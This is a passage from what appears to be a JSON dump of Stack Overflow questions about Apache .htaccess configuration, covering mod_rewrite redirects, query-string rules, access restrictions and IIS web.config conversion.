</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":219,"score":-1,"question_id":11544773,"title":"RewriteCond %{QUERY_STRING} in mod_rewrite (dynamic to static URL) not working (SOLVED)","body":"<p>As I have encountered very luck with managing to get querystrings to redirect correctly previously just passing querystring parameters, and the over-arching advice across this site and webmasterworld for querystring redirection seems to be \"deal with it as a RewriteCond querystring\", I'm trying to use the following type rule for a set of about 10 URLs.</p>\n\n<p>Example URL:</p>\n\n<pre><code>http://www.example.org/training_book.asp?sInstance=1&amp;EventID=139\n</code></pre>\n\n<p>What I have so far:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^training_book.asp\\?sInstance=1&amp;EventID=139  \nRewriteRule /clean-landing-url/ [NC,R=301,L]\n</code></pre>\n\n<p>So, what I want to happen is</p>\n\n<pre><code>http://www.site.org/training_book.asp?sInstance=1&amp;EventID=139 301&gt; http://www.site.org/clean-landing-url\n</code></pre>\n\n<p>but instead what is happening is this:</p>\n\n<pre><code>http://www.site.org/training_book.asp?sInstance=1&amp;EventID=139 301&gt; http://www.site.org/training_book.asp/?sInstance=1&amp;EventID=139\n</code></pre>\n\n<p>It's appending a forward slash just before the querystring, and then resolving the full URL (obviously, 404ing.)</p>\n\n<p>What am I missing? Is it a regex issue with the actual %{QUERY_STRING} parameter?</p>\n\n<p>Thanks in advance!</p>\n\n<h1>EDIT -</h1>\n\n<p>Here's where I am so far.</p>\n\n<p>Based upon the advice from @TerryE below, I've tried implementing the following rule. </p>\n\n<p>I have a set of URLs with the following parameters:</p>\n\n<pre><code>http://www.example.org/training_book.asp?sInstance=1&amp;EventID=139\nhttp://www.example.org/training_book.asp?sInstance=2&amp;EventID=256\nhttp://www.example.org/training_book.asp?sInstance=5&amp;EventID=188\n</code></pre>\n\n<p>etc.</p>\n\n<p>which need to redirect to </p>\n\n<pre><code>http://www.example.org/en/clean-landing-url-one\nhttp://www.example.org/en/clean-landing-url-two\nhttp://www.example.org/en/clean-landing-url-three\n</code></pre>\n\n<p>etc.</p>\n\n<p>This is the exact structure of the htaccess file I have currently, including the full examples of the \"simple\" redirects which are presently working fine (note - <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> > <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a> redirects enforced in httpd.conf)</p>\n\n<pre><code>#301 match top level pages\nRewriteCond %{HTTP_HOST} ^example\\.org [NC]\nRewriteRule ^/faq.asp /en/faqs/ [NC,R=301,L] \n</code></pre>\n\n<p>All URLs in this block are of this type. All these URLs work perfectly.</p>\n\n<pre><code>#Redirect all old dead PDF links to English homepage.\nRewriteRule ^/AR08-09.pdf /en/ [NC,R=301,L]\n</code></pre>\n\n<p>All URLs in this block are of this type. All these URLs work perfectly.</p>\n\n<p>The problem is here: I still can't get the URLs of the below type to redirect. Based upon advice from @TerryE, I attempted to change the syntax as below. The below block does not function correctly.</p>\n\n<pre><code>#301 event course pages\nRewriteCond %{QUERY_STRING} sInstance=1EventID=139$\nRewriteRule ^training_book\\.asp$ /en/clean-landing-url-one? [NC,R=301,L]\n</code></pre>\n\n<p>The output of this is </p>\n\n<pre><code>http://staging.example.org/training_book.asp/?sInstance=1&amp;EventID=139\n</code></pre>\n\n<p>(this is currently applying to staging.example.org, will apply to example.org)</p>\n\n<p>(I had \"hidden\" some of the actual syntax by changing it to event_book from training_book in the initial question, but I've changed it back to be as real as possible.)</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","apache2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12792908,"title":"mod_rewrite issue | Request exceeded the limit of 10 internal redirects","body":"<p>ok what Im doing normally works but since my rule \"includes\" itself is giving me issues and can't find a solution after hours working on different options.</p>\n\n<p>I have a .htaccess with:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_URI} !^/3.15.0/(.*)\nRewriteRule ^(.*)$ /3.15.0/$1 [L]\n</code></pre>\n\n<p>this is for my software versions, I have a program that can request sometimes versions that are updated and in the server may be behind a couple version so I want to be able to say that whatever is comming in forward to the latest version that in this example is 3.15.0</p>\n\n<pre><code>/var/www/nameblabla/3.15.0\n</code></pre>\n\n<p>my .htaccess is on <code>/var/www/nameblabla/.htaccess</code></p>\n\n<p>so the first Condition is to ignore request that already has the right path and version..\nthe second should be to grab all request and forward to 3.15.0... and of course not loose the path to the files I want from inside that should be the same.\nso far I can only get it to redirect to such directory but will loose the path\nand others I get the \"Request exceeded the limit of 10 internal redirects\" I guess this is because Im including the 3.15.0 path </p>\n\n<p>Any help or another way to do this with out mod_rewrite?</p>\n"},{"tags":[".htaccess"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1199,"score":4,"question_id":9943042,"title":"htaccess \"order\" Deny, Allow, Deny","body":"<p>I would like to allow only one country access, but exclude proxies within this country.</p>\n\n<p>This is what I have (shortened version for convenience)</p>\n\n<pre><code>&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from 139.82.0.0/16\nallow from 143.54.0.0/16\nallow from 186.192.0.0/11\nallow from 186.224.0.0/11\n.\n.\n.\ndeny from 186.201.27.66\ndeny from 186.201.196.1\ndeny from 186.214.51.231\ndeny from 186.237.225.26\n&lt;/Limit&gt;\n</code></pre>\n\n<p>But I know this wont work. How do I go about doing this?</p>\n\n<p>TIA</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":6435919,"title":"Rewrite Conditions in htaccess file","body":"<pre><code>RewriteCond %{HTTP_HOST} ^mysite.com$\nRewriteCond %{REQUEST_URI} ^/ex-ex[/]*\nRewriteRule ^(.*)$ /subsite/ex [R=permanent,L,NE]\n</code></pre>\n\n<p>I am redirecting <code>mysite.com/ex-ex</code> to <code>mysite.com/subsite/ex</code></p>\n\n<p>This is working fine, but <code>mysite.com/ex-ex/page1</code> redirects to <code>mysite.com/subsite/ex</code>. How can I redirect to <code>mysite.com/subsite/ex/page1</code>?</p>\n\n<p>How can I append the remaining part of url also to new url pattern?</p>\n"},{"tags":["php",".htaccess","url","redirect","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12791484,"title":"HTAccess Redirect To Remove File","body":"<p>My side resides in </p>\n\n<pre><code>www.domain.com/Folder/Front.php\n</code></pre>\n\n<p>So <em>inside</em> of Folder I have a .htaccess file that just has one line reading:</p>\n\n<pre><code>DirectoryIndex Front.php\n</code></pre>\n\n<p>So typing in <code>www.domain.com/Folder</code> is the same thing as <code>www.domain.com/Folder/Front.php</code>. However I want to <em>redirect</em> <code>www.domain.com/Folder/Front.php</code> <strong>TO</strong> <code>www.domain.com/Folder</code>. I know I have to have something like:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n</code></pre>\n\n<p>But I don't know what the Cond or Rule would be. Any ideas? Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite","subdomain"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12790946,"title":"Use .htacess RewriteCond for all subdirectories of a subdomain","body":"<p>How would I use a RewriteCond for all subdirectories of my subdomain</p>\n\n<p>Example: <code>test.example.com/folder1/page1.php</code> -> <code>code.example/folder1/page1.php</code> (showing test.example.com/folder1/page1.php in the address bar)</p>\n\n<p>I'm currently using:</p>\n\n<pre>RewriteCond %{HTTP_HOST} ^(.+)\\.example\\.com\nRewriteRule ^(.*)$ http://code.example.com/$1 [CO=cookie:%1:.example.com:126144000:/,P]</pre>\n\n<p>and that does what I want for <code>test.example.com/page2.php</code> -> <code>code.example.com/page2.php</code> (showing test.example.com/page2.php in the address bar)<br>\nbut when I do <code>test.example.com/folder1/page1.php</code> -> <code>code.example.com/folder1/page1.php</code> I see code.example.com/folder1/page1.php (which I do <strong>NOT</strong> want)</p>\n"},{"tags":[".htaccess","cakephp","web-config","cakephp-2.0","cakephp-2.2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":12497904,"title":"Htaccess and CakePHP 2 on windows IIS7","body":"<p>I was having problems trying to configure the mod rewrite over windows and II7:\n<a href=\"http://stackoverflow.com/questions/12492078/cakephp-2-2-2-not-working-on-windows-iis7\">CakePHP 2.2.2 not working on Windows IIS7</a> but finally i could import the htaccess in order to create the <strong>web.config</strong> file for IIS7.</p>\n\n<p>The thing is:\nNow that file has been created in cakephp folder and i can access to the main page <strong>BUT</strong> it has not been created inside <em>app/</em> or <em>app/webroot</em> in which you can find 2 more .htaccess files.</p>\n\n<p>Now, i can not access any other view than the main site, it shows a 404 page not found error and i am pretty sure that it is because it is not getting those .htaccess files on the web.config.</p>\n\n<p>My cakephp <strong>web.config</strong> file looks like this:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n&lt;system.webServer&gt;\n    &lt;rewrite&gt;\n        &lt;rules&gt;\n            &lt;rule name=\"Imported Rule 1\" stopProcessing=\"true\"&gt;\n                &lt;match url=\"^$\" ignoreCase=\"false\" /&gt;\n                &lt;action type=\"Rewrite\" url=\"app/webroot/\" /&gt;\n            &lt;/rule&gt;\n            &lt;rule name=\"Imported Rule 2\" stopProcessing=\"true\"&gt;\n                &lt;match url=\"(.*)\" ignoreCase=\"false\" /&gt;\n                &lt;action type=\"Rewrite\" url=\"app/webroot/{R:1}\" /&gt;\n            &lt;/rule&gt;\n        &lt;/rules&gt;\n    &lt;/rewrite&gt;\n&lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Although the CakePHP documentation tells you to add a different code (which makes the views work but no styles are loaded. And the home page don't work.)\n<a href=\"http://book.cakephp.org/2.0/en/installation/advanced-installation.html#url-rewrites-on-iis7-windows-hosts\" rel=\"nofollow\">http://book.cakephp.org/2.0/en/installation/advanced-installation.html#url-rewrites-on-iis7-windows-hosts</a></p>\n\n<p>When trying to access a CSS file from the URL i get this message:</p>\n\n<pre><code>Missing Controller\n\nError: CssController could not be found.\n\nError: Create the class CssController below in file: app\\Controller\\CssController.php\n\n&lt;?php\nclass CssController extends AppController {\n\n}\n</code></pre>\n\n<p>Any idea? Working with Cakephp over windows is driving me crazy...</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12789886,"title":"HTAccess Open only to Website","body":"<p>To secure my site I placed blank htmls along with an htaccess file in every subdirectory but I didn't realize the denying all access would also mean denying access from the website itself. When I try to load a page, and it goes into the Images folder, the server responds with:</p>\n\n<pre><code>Failed to load resource: the server responded with a status of 403 (Forbidden) \n</code></pre>\n\n<p>So how do I change this htaccess code:</p>\n\n<pre><code>order allow,deny\ndeny from all\n\nOptions All -Indexes\n</code></pre>\n\n<p>To deny access to everything <em>outside</em> of the website, meaning the website itself can access its own content (images, js, css) but no one outside can.</p>\n"},{"tags":["apache",".htaccess","filtering","flags"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12788368,"title":"htaccess filtering settings","body":"<p>I have this site like a search engine When i type a search the url looks like <code>mysite.com/search/free/**video/keyword**.html</code> instead of <code>mysite.com/?search=**keyword**&amp;type=**video**</code> and i have small issue with this. For example if a search tag contain spaces, + or -, my url is not getting rewrited. I get query strings url like ?search=<strong>key+word</strong>&amp;type=<strong>video</strong>  and i don't know how to get rid of this. \nThis is my htaccess.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteBase / \nRewriteCond %{QUERY_STRING} ^search=(\\w+)&amp;type=(\\w+)$\nRewriteRule ^ http://mysite.com\\/search\\/free\\/%2\\/%1.html? [R,L,B]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^search/(.*)/(.*)/(.*).html?$ index.php?search=$1&amp;page=$2&amp;type=$3 [L]\n</code></pre>\n\n<p></p>\n\n<p>I tryed adding changing $1 with ${escape:$1} and added RewriteMap escape int:escape in my httpd.conf file but still no luck. </p>\n"},{"tags":["php","html",".htaccess","url","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12790131,"title":"HTAccess Redirect and Remove File+Extension","body":"<p>If the user types </p>\n\n<pre><code>www.example.com/Front\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>www.example.com/Front.php\n</code></pre>\n\n<p>I want to redirect to</p>\n\n<pre><code>www.example.com\n</code></pre>\n\n<p>Here's my htaccess:</p>\n\n<pre><code>RewriteEngine on\n\nDirectoryIndex Front.php\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /([^/]+)/([^\\.]+)\\.php\\ HTTP/\nRewriteRule ^([a-zA-Z0-9_-]+)/([^.]+)\\.php$ http://www.example.com/$1/$2 [R=301,L]\n</code></pre>\n\n<p>But for some reason, when I type <code>www.example.com/Front.php</code> the page loads but the url doesn't change, it stays as <code>/Front.php</code>. What do I need to add/change to make it redirect properly? Thanks</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12764430,"title":"Adding trailing slash to URL using htaccess","body":"<p>I'm trying to re-write my URL using htaccess. Here is the code from my htaccess: </p>\n\n<pre><code>RewriteRule ^post/([^/.]+)?/([^/.]+)?$\npost.php?pst=$1&amp;view=$2%{QUERY_STRING}\n</code></pre>\n\n<p>Everything is working fine, except that this code doesn't add a trailing slash at the end of the re-written URL. How can I add that?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1286,"score":2,"question_id":5745490,"title":"ReWrite rule to add .html extension","body":"<p>I need a rule that will add an .html extension whenever there is 'not' a trailing slash.</p>\n\n<p>A new client recently changed ecommerce scripts and the new version handles SEO differently and changed all of their 16,000+ product links. This was not caught prior to the site being re-indexed so we need to redirect the old to the new..</p>\n\n<p>All products used to have links like this\ndomain.com/category/productname\nbut are now\ndomain.com/category/productname.html</p>\n\n<p>Category links did not change and all are like this\ndomain.com/category/ (with trailing slash)</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12787362,"title":"add a string in htaccess based on a string value","body":"<p>I want to change the url</p>\n\n<p>FROM</p>\n\n<p><a href=\"http://www.example.com/option=com_content&amp;view=propertyshow&amp;pid=47610\" rel=\"nofollow\">http://www.example.com/option=com_content&amp;view=propertyshow&amp;pid=47610</a></p>\n\n<p>TO</p>\n\n<p><a href=\"http://www.example.com/index.php?option=com_content&amp;view=propertyshow&amp;pid=47610\" rel=\"nofollow\">http://www.example.com/index.php?option=com_content&amp;view=propertyshow&amp;pid=47610</a></p>\n\n<p>How can I do it in .htaccess</p>\n"},{"tags":["php","mysql",".htaccess","google-maps-api-3"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12755634,"title":"Google Maps API - Marker URL/ID","body":"<p>When a user clicks on a marker on my map, I'd like it to have it's own URL.</p>\n\n<p>For example, if a user clicks on Marker A, the url would change to <a href=\"http://example.com/m/132\" rel=\"nofollow\">http://example.com/m/132</a>. Ideally, it would be linked to the markers ID in the SQL table.</p>\n\n<p>The idea is that each marker, and therefore information section, can be shared. So, a user could share a review he wrote for Marker A (each marker will have a reviews system). If they shared it, the URL would be <a href=\"http://example.com/m/132/review#1\" rel=\"nofollow\">http://example.com/m/132/review#1</a> for example.</p>\n\n<p>I've done a fair bit of research, but haven't come up with any solutions.</p>\n\n<p>Can anyone point me in the right direction?</p>\n\n<p>Thanks :)</p>\n"},{"tags":["php",".htaccess","zend-framework","url-routing","aruba"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":34,"score":-6,"question_id":12785650,"title":"URL not working in Zend Framework on a linux server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12785211/error-with-url-in-zend-framework-working-on-a-linux-server\">Error with URL in Zend Framework working on a linux server</a>  </p>\n</blockquote>\n\n\n\n<p>I have a problem with a web application built with Zend Framework. I loaded the application on Aruba's web space, currently in a shared configuration (both Windows and Linux, but currently the service points to the Linux space) and the entire project is located in a subfolder, ie: www.mysite.it/subfolder/{here is the entire project}</p>\n\n<p>Trying to launch the application using the URL, I have different situations:</p>\n\n<ul>\n<li>if I try: www.mysite.it/subfolder/public runs the controller Index and the Index action</li>\n<li>if I try: www.mysite.it/subfolder/public/index returns \"Not Found\"</li>\n<li>if I try: www.mysite.it/subfolder/public/index/index returns \"Not Found\"</li>\n<li>if I try: www.mysite.it/subfolder/public/Index runs the Index controller and the index action</li>\n<li>if I try: www.mysite.it/subfolder/public/index/index runs the Index Controller and the index action</li>\n</ul>\n\n<p>As mentioned above, if I order the controller by specifying the first letter in uppercase, everything works perfectly, otherwise the application will not work.</p>\n\n<p>Searching on Google, I read that this situation could be due to the Apache module \"mod_speling,\" but I'm not fully convinced. However, I cannot change the Apache configuration on that web service. I designed the application just on linux platform, and locally has not given me any problems.</p>\n\n<p>I guess if I'm doing something wrong, or is there some configuration that I have not successfully completed? If you need, I can post here the code of the application. Thank you.</p>\n\n<p>.htaccess contents</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","cloudflare"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12785699,"title":"Can't deny access from some countries","body":"<p>i did take a look to many documents like this</p>\n\n<p><a href=\"http://www.asiteaboutnothing.net/c_block-countries.html\" rel=\"nofollow\">http://www.asiteaboutnothing.net/c_block-countries.html</a></p>\n\n<p>but couldn't find any working example</p>\n\n<p>i blocked my own country can still access</p>\n\n<pre><code>SetEnvIf CF-IPCountry DE BuzzOff=1\nOrder allow,deny\nAllow from all\nDeny from env=BuzzOff\n</code></pre>\n\n<p>doesn't work</p>\n"},{"tags":["apache",".htaccess","dns"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12785151,"title":"How do I point a domain to a specific directory?","body":"<p>I have two domains pointing to the same IP address.</p>\n\n<p>They both go to the directory <code>/public_html/www/</code>.</p>\n\n<p>What is the best way to make the home directory of one of the domains <code>/public_html/www/somethingelse/</code>?</p>\n"},{"tags":["html","wordpress",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":101,"score":2,"question_id":11926237,"title":"Redirecting old .html page to new without html extension page?","body":"<p>I've just changed permalinks in my wordpress site.</p>\n\n<p>And my old links were like that,</p>\n\n<pre><code>http://www.sitename.com/category/postname.html\n</code></pre>\n\n<p>Now new links are </p>\n\n<pre><code>http://www.sitename.com/category/postname/\n</code></pre>\n\n<p>I'm getting 404 error at old links, how can i redirect all .html pages to new non .html pages  with .htaccess?</p>\n"},{"tags":[".htaccess","search","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12784071,"title":"search query result page redirecting with .htaccess","body":"<p>I would like to know how I can redirect from my old Online Dictionary Search Page to New Search Query Page.</p>\n\n<p>query example url look like as below.</p>\n\n<p>Old Query URL:</p>\n\n<p><a href=\"http://domain.com/folder1/folder2/index.php?searchterm=love\" rel=\"nofollow\">http://domain.com/folder1/folder2/index.php?searchterm=love</a></p>\n\n<p>to New Site.</p>\n\n<p><a href=\"http://domain.com/search/love\" rel=\"nofollow\">http://domain.com/search/love</a></p>\n\n<p>Many thanks in Advance.</p>\n\n<p>best regards,</p>\n\n<p>Koko</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12781624,"title":"WordPress like .htacces nice urls","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3033407/htacces-to-create-friendly-urls-help-needed\">.htacces to create friendly URLs. Help needed</a>  </p>\n</blockquote>\n\n\n\n<p>I want to build a script like WordPress for the \"nice urls\", i copied the .htaccess rows and made some modifications, but on the side of the PHP i don't know how to build it.</p>\n\n<p>I don't understand how it works.</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12778975,"title":"Make Codeigniter ignore directory","body":"<p>I have Codeigniter installed and working for my main site. </p>\n\n<p>But I am now trying to add an add-on domain to the same hosting account, so I can have two sites running on the same hosting. Add-on domains make a new folder in the main public_html folder to store the web files. </p>\n\n<p>How can I get Codeigniter to ignore this directory? The site doesn't load properly when I try and view it. </p>\n\n<p>I have an SSL on the main site too and redirection for www URLS. Here's my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^www\\.mysite\\.co.uk$ [NC]\nRewriteRule ^(.*)$ http://mysite.co.uk/$1 [L,R=301]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php/$1\n\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} (site|sections|here)\nRewriteRule ^(.*)$ https://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{HTTPS} onsite|sections|here)\nRewriteRule ^(.*)$ http://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1339,"score":3,"question_id":9825183,"title":".htaccess allow access to files only from includes","body":"<p>I have various subfolders on my website and I would like for the user not to be able to access them through URL but on the same time my main PHP files to be able to include them or use them as actions on forms or links. </p>\n\n<p>I tried using an .htaccess with </p>\n\n<pre><code>&lt;Files *&gt;\n    Order Allow,Deny\n    Deny from All\n&lt;/Files&gt;\n</code></pre>\n\n<p>but it denied all access even from within my own scripts. Logical as I found out, but I cannot know how to make it work. Any ideas? </p>\n\n<p>P.S. My main concern is that some of the files are not included in main PHP files BUT they are linked there and their code ends up with a <code>header('Location: ../index.php');</code> returning to the main page of the project.</p>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12778497,"title":"change URL with URL rewritting","body":"<p>I have URL of like </p>\n\n<p><code>abc.com/?index.php&amp;page=s-index&amp;do=product&amp;pos=&amp;pid=1</code></p>\n\n<p>Now I want to conver this URL like</p>\n\n<p><code>abc.com/productname.html</code></p>\n\n<p>And</p>\n\n<p>if URL Like this</p>\n\n<p><code>abc.com/?index.php&amp;page=s-index&amp;do=product&amp;pos=&amp;pid=1,1234</code></p>\n\n<p>Then I want to convert URL Like</p>\n\n<p><code>abc.com/productname/subproductname.html</code></p>\n"},{"tags":[".htaccess","directoryindex"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12778393,"title":"htaccess DirectoryIndex not obeying","body":"<pre><code>DirectoryIndex index.html index.htm index.php\n</code></pre>\n\n<p>This should use html and then php for the directory index, and it does. But when I manually type index.php in the url, I'm redirected to index.html. Can this be avoided?</p>\n\n<p>If I remove the .htaccess file index.php becomes the default, so I guess the server is readin the instructions but not obeying them as I would expect.</p>\n"},{"tags":[".htaccess","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12777615,"title":"htaccess to web.config. How can I convert it?","body":"<p>I have the following .htaccess code:</p>\n\n<pre><code>Header unset ETag\nFileETag None\n\nAddOutputFilterByType DEFLATE text/css text/html application/x-javascript application/javascript\nBrowserMatch ^Mozilla/4 gzip-only-text/html\nBrowserMatch ^Mozilla/4\\.0[678] no-gzip\nBrowserMatch \\bMSIE !no-gzip !gzip-only-text/html\n\nExpiresActive On\nExpiresDefault A0\nExpiresByType image/gif A2592000\nExpiresByType image/png A2592000\nExpiresByType image/jpg A2592000\nExpiresByType image/jpeg A2592000\nExpiresByType image/ico A2592000\nExpiresByType text/css A2592000\nExpiresByType text/javascript A2592000\nExpiresByType application/x-javascript A2592000\nExpiresByType application/javascript   A2592000\nExpiresByType application/octet-stream A2592000\n</code></pre>\n\n<p>Unfortunatly, I don't have any idea on how to configure IIS.</p>\n\n<p>Is there any way, to convert that htaccess directives into web.config ?</p>\n\n<p>Kind regards\nMerianos Nikos</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12777193,"title":"redirect to maintainence page... how to choose pages","body":"<p>so i've manage to redirect all urls to a specific page for maintenance. That works ok.\nMy problem is that i don't want all urls to go to maintenance... just two..</p>\n\n<p>How do i redirect when a user click the following url's (including subfolder,etc...):</p>\n\n<pre><code>http://www.mysite.com/discography/\nhttp://www.mysite.com/songbook/\n</code></pre>\n\n<p>this is my code that works ok (i've allowed my localhost ip address and the ip address on my live site to bypass the rules):</p>\n\n<pre><code>RewriteCond %{REMOTE_ADDR} !^99\\.999\\.99\\.999\nRewriteCond %{REMOTE_ADDR} !^0\\.0\\.0\\.0\nRewriteCond %{REQUEST_URI} !/maintenance.php$ [NC]\nRewriteRule .* /maintenance.php [R=307,L]\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter-2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12775711,"title":"images not appearing after changing .htaccess file in codeigniter 2.1.0","body":"<p>here is my .htaccess file</p>\n\n<pre><code>RewriteEngine On\n#RewriteCond $1 !^(index\\.php|css|images|js|tp|files)\nRewriteCond $1 !^(index\\.php|css|Images|js|tp|files)\nRewriteRule ^(.+)$ index.php?$1 [L]\n</code></pre>\n\n<p>after removing \"index.php\" from config file everything is working fine except that images are not displaying</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12740173,"title":"Need code of URL rewriting in .htaccess","body":"<p>I know there are many questions and answers regarding URL rewriting but i have not found any which can solve my equation so i am putting here a question regarding my problem after a long and deep search.</p>\n\n<p>I need this URL:</p>\n\n<pre><code>www.example.com/team/suman/1\n</code></pre>\n\n<p>to be changed to:</p>\n\n<pre><code>www.example.com/team/suman\n</code></pre>\n\n<p>I am not finding any way to write code in htaccess.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12769159,"title":"Rewrite PHP Query URL to Image with .htaccess Mod Rewrite Rule","body":"<p>How can I rewrite a PHP query url to an actual image? </p>\n\n<p>I'd like <em>http://localhost/img.php?image=winter.jpg</em> to be rewritten to <em>http://localhost/img/winter.jpg</em> The image name changes dynamically. </p>\n\n<p>I tried like this but it doesn't work. </p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.+img\\.php\\?.*?image\\=(.+)[$&amp;] ./img/$1 [NC]\n</code></pre>\n\n<p>Thanks.</p>\n\n<p>[Update]</p>\n\n<p>After accessing <em>http://localhost/img.php?image=winter.jpg</em> the following text was appended to the log file. The browser shows the message, \"Object Not Found! The requested URL was not found on this server. If you entered the URL manually please check your spelling and try again.\"</p>\n\n<pre><code>127.0.0.1 - - [&lt;time&gt;] [localhost/sid#975148][rid#4d09cb8/initial] (3) [perdir Z:/xampp/htdocs/] strip per-dir prefix: Z:/xampp/htdocs/img.php -&gt; img.php\n127.0.0.1 - - [&lt;time&gt;] [localhost/sid#975148][rid#4d09cb8/initial] (3) [perdir Z:/xampp/htdocs/] applying pattern '^.+img\\.php\\?.*?image=(.+)[$&amp;]' to uri 'img.php'\n127.0.0.1 - - [&lt;time&gt;] [localhost/sid#975148][rid#4d09cb8/initial] (3) [perdir Z:/xampp/htdocs/] pass through Z:/xampp/htdocs/img.php\n</code></pre>\n\n<p>[Update]</p>\n\n<p>The error logs says,</p>\n\n<pre><code>[&lt;time&gt;] [error] [client 127.0.0.1] script 'Z:/xampp/htdocs/img.php' not found or unable to stat\n</code></pre>\n\n<p>So I created a dummy file named <code>img.php</code> and the error stated not being shown any more. I've assumed that a dummy file was not necessary. Now it only displays the contents of the dummy PHP file when I access <em>http://localhost/img.php?image=winter.jpg</em></p>\n\n<p>I tried <code>[NC,L]</code>, <code>[R,NC]</code>, <code>[R,NC,L]</code> but none of them worked.</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12774377,"title":"Need to rewrite php? url to url with folder","body":"<p>I'm driving my site with php and need to rewrite a specific php url call to a folder... the example is on my local site before uploading hence no <a href=\"http://www.etc\" 